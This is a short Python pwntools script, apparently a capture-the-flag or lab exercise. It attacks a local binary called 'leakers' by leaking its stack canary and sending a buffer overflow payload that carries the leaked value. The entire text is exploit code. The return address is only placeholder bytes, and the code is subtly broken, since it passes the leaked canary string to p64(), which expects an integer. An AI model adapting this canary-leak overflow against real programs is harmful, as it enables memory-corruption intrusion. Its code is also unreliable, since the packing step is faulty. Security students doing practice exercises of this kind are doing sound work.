from pwn import *

#we have a canary
#check it with checksec --file ./fileName

#I NEED TO CREATE A TMUX SESSION
context.terminal = ['tmux', 'splitw', '-h'] #when i execute this will create a terminal with program and another with gdb
#ssh = ssh("jinblack", "192.168.56.102")
#r = ssh.process("./leakers") #execute a process throug ssh
r = process("./leakers")
gdb.attach(r, '''
''') #inside the quote i can put the breakpoint
context.log_level = "debug"

raw_input("wait") #this is needed because i need some time before gdb will attach

r.sendline("A"*100)

r.sendline("B"*104 + "C")

r.recvuntil("C")
canary = "\x00" + r.recv(7)
print "canary is " + canary

payload = "B"*104 + p64(canary) + "D"*8 + "E"*8
r.sendline(payload)

r.interactive()